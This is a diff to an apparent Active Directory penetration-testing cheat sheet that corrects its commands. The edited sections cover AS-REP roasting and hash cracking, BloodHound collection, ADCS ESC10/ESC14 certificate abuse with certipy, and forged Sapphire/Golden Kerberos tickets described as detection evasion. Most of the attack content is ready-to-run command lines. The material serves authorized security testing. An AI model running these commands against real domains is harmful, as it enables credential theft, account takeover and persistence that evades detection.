@@ -310,13 +310,13 @@ Get-Content users.txt | ForEach-Object {
 
 ### 1.4 AS-REP Roasting (Pre-Auth Disabled)
 
-> For cracking AS-REP hashes (mode 18200), see [password-cracking.md](password-cracking.md) Phase 5.4.
+> For cracking AS-REP hashes (mode 18200), see [password-cracking.md](password-cracking.md) Phase 5.5.
 ```bash
 # Without user list (requires LDAP anonymous bind)
-impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -request -format hashcat
+impacket-GetNPUsers <DOMAIN>/ -no-pass -dc-ip <DC_IP> -request -format hashcat
 
 # With user list
-impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -request -format hashcat -outputfile asrep_hashes.txt
+impacket-GetNPUsers <DOMAIN>/ -no-pass -dc-ip <DC_IP> -usersfile users.txt -request -format hashcat -outputfile asrep_hashes.txt
 
 # Crack
 hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
@@ -407,9 +407,6 @@ smbpasswd -r <DC_IP> -U '<USER>'
 
 # Method 3: rpcclient setuserinfo2
 rpcclient -U '<DOMAIN>/<USER>%<OLD_PASSWORD>' <DC_IP> -c "setuserinfo2 <USER> 23 '<NEW_PASSWORD>'"
-
-# Method 4: impacket-smbpasswd (alternative wrapper)
-impacket-smbpasswd '<DOMAIN>/<USER>:<OLD_PASSWORD>'@<DC_IP> -newpass '<NEW_PASSWORD>'
 ```
 
 ```bash
@@ -535,7 +532,7 @@ python3 dnstool.py -u '<DOMAIN>\<USER>' -p '<PASSWORD>' -r '*' --action remove -
 
 ```bash
 # Collector from Linux
-# https://github.com/dirkjanm/BloodHound.py
+# https://github.com/dirkjanm/bloodhound.py — CE branch / `bloodhound-ce` PyPI package (NOT legacy bloodhound-python)
 bloodhound-ce-python -u '<USER>' -p '<PASSWORD>' -ns <DC_IP> -d <DOMAIN> -c all --zip
 
 # With NTLM hash (LDAP signing issues? Use SharpHound on target instead)
@@ -2455,8 +2452,8 @@ certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -retrieve <R
 reg query "HKLM\SYSTEM\CurrentControlSet\Services\Kdc" /v StrongCertificateBindingEnforcement
 # 0=disabled, 1=compat (both vulnerable), 2=enforced (blocks ESC9/ESC10 Case 1 — try ESC16)
 
-# Check CertificateMappingMethods (ESC10 Case 2) — different registry key:
-reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" /v CertificateMappingMethods
+# Check CertificateMappingMethods (ESC10 Case 2) — Schannel registry key:
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" /v CertificateMappingMethods
 # Default 0x18; bit 0x4 = UPN mapping enabled (vulnerable for Schannel)
 
 # Exploit (requires GenericWrite on a controlled user):
@@ -2509,20 +2506,19 @@ certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<
 certipy-ad auth -pfx cert.pfx -dc-ip <DC_IP> -domain <DOMAIN>
 ```
 
-### 7.6 ESC14 — Explicit Application Policy Mapping
+### 7.6 ESC14 — Explicit Certificate Mapping (`altSecurityIdentities`)
 
-ESC14 abuses issuance policies that explicitly map to a group via the `msDS-OIDToGroupLink` attribute on the OID object in the configuration partition. Unlike ESC13 (where the OID link is on the template), ESC14 targets the OID object itself.
+ESC14 abuses write rights over a victim's `altSecurityIdentities` attribute to bind an attacker-controlled cert to that account, then PKINIT-auths as the victim. Distinct from ESC13 (OID-to-group on a template's issuance policy). Reference: [SpecterOps ESC14 abuse](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9).
 
 ```bash
-# Enumerate — certipy flags ESC14 when an issuance policy OID has msDS-OIDToGroupLink set
+# Enumerate
 certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout
-# Look for: ESC14 in output — issuance policy OID linked to a privileged group
 
-# Attack: If you have write access to the OID object in CN=OID,CN=Public Key Services:
-# 1. Link the issuance policy OID to a high-privilege group
-#    (requires WriteDACL/WriteProperty on the OID object — check BloodHound for ACL edges)
-# 2. Request a certificate from a template that includes this issuance policy
-certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE_WITH_POLICY>' -target <DC_IP>
+# Attack — needs WriteProperty on victim's altSecurityIdentities (BloodHound edge)
+certipy-ad req -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template 'User' -target <DC_IP>
+certipy-ad account update -u '<USER>@<DOMAIN>' -p '<PASSWORD>' \
+    -user '<VICTIM>' -alt-security-identity 'X509:<I><CERT_ISSUER_DN><S><CERT_SUBJECT_DN>' \
+    -dc-ip <DC_IP>
 
 # 3. Authenticate — the certificate grants effective membership in the linked group
 certipy-ad auth -pfx cert.pfx -dc-ip <DC_IP> -domain <DOMAIN>
@@ -3104,9 +3100,9 @@ impacket-ticketer \
 # -duration 36000 (10 hours) = matches normal TGT lifetime → less anomalous than the default 10y.
 ```
 
-### 10.4b Sapphire Ticket — AES-Forged Golden TGT (Detection Evader)
+### 10.4b Sapphire Ticket — TGT with S4U2self+U2U-Sourced PAC (Detection Evader)
 
-A Sapphire Ticket is a **Golden Ticket forged with the krbtgt AES256 key** (instead of the more commonly observed RC4/NT hash). The forged TGT is encrypted with AES256 by default — sidestepping detections that key on RC4-encrypted TGTs (`Ticket Encryption Type = 0x17`) on Event 4769. Reference: Charlie Clark / SpecterOps, "Sapphire Tickets," Sept 2022.
+A Sapphire Ticket builds on a legitimate ticket: the PAC of a privileged user is fetched via S4U2self+U2U, then injected into a forged TGT. No PAC discrepancy with AD = stealthier than Diamond/Golden. Reference: [thehacker.recipes — Sapphire tickets](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire).
 
 ```bash
 # Prerequisite: krbtgt account's AES256 key (NOT the target user's key — it must be krbtgt's,
@@ -4169,7 +4165,10 @@ Reanimate-Tombstones  → Restore-ADObject — resurrect deleted user (Phase 4.9
 | AS-REP (Kerberos) | `-m 18200` | GetNPUsers |
 | TGS (Kerberoast) | `-m 13100` | GetUserSPNs |
 | MSCache2 (DCC2) | `-m 2100` | Cached domain creds |
-| Kerberos 5 AES-256 | `-m 19900` | Kerberoast AES tickets |
+| Kerberoast AES-128 (TGS-REP etype 17) | `-m 19600` | GetUserSPNs |
+| Kerberoast AES-256 (TGS-REP etype 18) | `-m 19700` | GetUserSPNs |
+| AS-REP-Roast AES-128 (Pre-Auth etype 17) | `-m 19800` | GetNPUsers |
+| AS-REP-Roast AES-256 (Pre-Auth etype 18) | `-m 19900` | GetNPUsers |
 
 ---
 
@@ -4184,7 +4183,7 @@ Reanimate-Tombstones  → Restore-ADObject — resurrect deleted user (Phase 4.9
 | User enumeration (no creds) | `kerbrute userenum` | `kerbrute.exe userenum` |
 | AS-REP Roast | `impacket-GetNPUsers` | `Rubeus.exe asreproast` |
 | Kerberoast | `impacket-GetUserSPNs` | `Rubeus.exe kerberoast` |
-| Password spray | `netexec smb/ldap`, `kerbrute passwordspray` | `Rubeus.exe brute` |
+| Password spray | `netexec smb/ldap`, `kerbrute passwordspray` | `Rubeus.exe brute` *(community-forked builds only — not in mainline Rubeus; use `Invoke-DomainPasswordSpray.ps1` for a universally-available alternative)* |
 | BloodHound collection | `bloodhound-ce-python -c all` | `SharpHound.exe -c All` |
 | LDAP enumeration | `ldapsearch`, `ldapdomaindump` | `PowerView`, `ADModule` |
 | SMB enumeration | `netexec smb --shares/--users` | `PowerView Get-NetShare` |
@@ -4227,7 +4226,7 @@ Run through this checklist on every AD engagement. Each misconfiguration is an a
 
 | Misconfiguration | Check Command | Impact | Attack |
 |---|---|---|---|
-| Pre-auth disabled on accounts | `impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt` | Offline hash cracking | AS-REP Roasting (1.4) |
+| Pre-auth disabled on accounts | `impacket-GetNPUsers <DOMAIN>/ -no-pass -dc-ip <DC_IP> -usersfile users.txt` | Offline hash cracking | AS-REP Roasting (1.4) |
 | SPNs on user accounts | `impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASS>' -dc-ip <DC_IP>` | Offline hash cracking | Kerberoasting (3.1) |
 | Weak password policy | `netexec smb <DC_IP> -u '<USER>' -p '<PASS>' --pass-pol` | Password spraying | Spray common patterns (1.5) |
 | No account lockout | Same as above (check lockout threshold = 0) | Unlimited brute-force | Brute-force any account |
